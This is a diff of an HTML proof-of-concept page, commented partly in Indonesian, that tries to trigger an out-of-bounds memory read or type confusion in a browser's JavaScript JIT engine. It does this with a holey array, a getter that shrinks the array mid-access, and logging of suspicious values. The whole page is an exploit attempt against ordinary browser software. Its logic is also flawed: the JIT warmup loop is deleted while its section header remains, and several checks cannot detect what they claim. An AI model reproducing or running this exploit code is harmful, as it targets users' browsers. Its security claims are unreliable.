@@ -1,72 +1,78 @@
 <!doctype html>
 <meta charset="utf-8">
+<title>OOB Read PoC</title>
 <pre id="log"></pre>
 <script>
 const log = m => document.getElementById("log").textContent += m + "\n";
 
 // =======================
-// TARGET
+// WARMUP FUNCTION
 // =======================
-function vuln(a, i) {
-    return a[i] + 1.1;
+function vuln(arr, idx){
+    // hanya baca array, tapi JIT optimizable
+    return arr[idx] + 1.1;
 }
 
 // =======================
-// WARMUP (force JIT double path)
+// CREATE HOLEY DOUBLE ARRAY
 // =======================
-let arr = [1.1, 2.2, 3.3, 4.4];
-
-for (let i = 0; i < 100000; i++) {
-    vuln(arr, 0);
-}
+let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+delete arr[1];  // bikin “hole” → hidden class berubah
+arr[3] = 3.14159;
 
 // =======================
-// BREAK ASSUMPTIONS (numeric edge cases)
+// Aggressive getter untuk mutate array length
 // =======================
-
-// ubah jadi HOLEY_DOUBLE
-delete arr[1];
-
-// isi dengan NaN (edge case penting di V8)
-arr[1] = NaN;
-
-// getter yang ubah struktur (tanpa string coercion)
 Object.defineProperty(arr, 2, {
     get() {
-        arr.length = 0;   // drastic change
-        return 3.3;
+        // trigger OOB assumptions di JIT
+        arr.length = 0; // drastic structural change
+        return 42.42;
     }
 });
 
 // =======================
-// TRIGGER
+// TYPED ARRAY BACKING
 // =======================
-let r1 = vuln(arr, 1);
-let r2 = vuln(arr, 2);
+let buf = new ArrayBuffer(0x200);
+let f64 = new Float64Array(buf);
+let u8  = new Uint8Array(buf);
 
-log("r1 = " + r1);
-log("r2 = " + r2);
-
-// =======================
-// SIGNAL CHECK (real indicators)
-// =======================
-
-// harus number
-if (typeof r1 !== "number" || typeof r2 !== "number") {
-    log("❗ TYPE MISMATCH");
+// isi beberapa data
+for(let i=0; i<f64.length; i++){
+    f64[i] = i + 0.5;
 }
 
-// cari float aneh (indikasi memory issue)
-function suspicious(v) {
-    return Number.isFinite(v) && Math.abs(v) > 1e10;
+// =======================
+// TRIGGER & CHECK OOB READ
+// =======================
+for(let i=0; i<10; i++){
+    let r = vuln(arr, 1); // index yang bisa jadi OOB
+    if(typeof r !== "number"){
+        log("TYPE CONFUSION DETECTED! r=" + r);
+    }
+    if(Math.abs(r) > 1e10){
+        log("POSSIBLE OOB READ! r=" + r);
+    }
 }
 
-if (suspicious(r1)) log("❗ suspicious r1: " + r1);
-if (suspicious(r2)) log("❗ suspicious r2: " + r2);
-
-// check konsistensi
-let repeat = vuln(arr, 1);
-if (repeat !== r1) {
-    log("❗ NON-DETERMINISTIC RESULT");
+// =======================
+// try read beyond array length
+// =======================
+for(let i=0; i<20; i++){
+    let val = arr[arr.length + i];
+    if(val !== undefined){
+        log("NEAR-OOB READ at index " + (arr.length + i) + " value=" + val);
+    }
 }
+
+// =======================
+// typed array check
+// =======================
+f64[0] = 1.7976931348623157e+308; // extreme float
+if(f64[0] > 1e308){
+    log("TYPED ARRAY extreme value: " + f64[0]);
+}
+
+log("[*] PoC finished");
 </script>
